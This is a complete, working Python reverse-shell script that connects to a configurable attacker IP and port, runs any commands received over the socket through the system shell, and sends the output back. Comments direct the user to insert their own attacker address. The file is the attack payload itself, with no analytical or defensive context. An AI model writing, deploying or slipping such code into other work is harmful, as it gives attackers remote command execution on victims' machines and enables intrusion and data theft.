import socket
import subprocess
import os

# Define attacker IP and port (change these to your own)
ATTACKER_IP = '0.0.0.0'  # Attacker's IP address
ATTACKER_PORT = 4444         # Port on which the attacker is listening

def reverse_shell():
    # Connect to the attacker's machine
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ATTACKER_IP, ATTACKER_PORT))
    
    # Send a welcome message
    s.send(b'Connected to reverse shell\n')
    
    while True:
        # Receive command from attacker
        command = s.recv(1024).decode('utf-8').strip()
        
        if command.lower() == 'exit':  # If the attacker sends 'exit', close the connection
            s.send(b'Exiting...\n')
            break
        
        # Execute the received command
        try:
            if command.startswith("cd "):  # Handle 'cd' command separately
                os.chdir(command[3:])
                s.send(f"Changed directory to {os.getcwd()}\n".encode())
            else:
                # Execute the command and capture output
                output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
                s.send(output)
        except Exception as e:
            error_message = f"Error: {str(e)}\n"
            s.send(error_message.encode())
    
    s.close()

if __name__ == '__main__':
    reverse_shell()

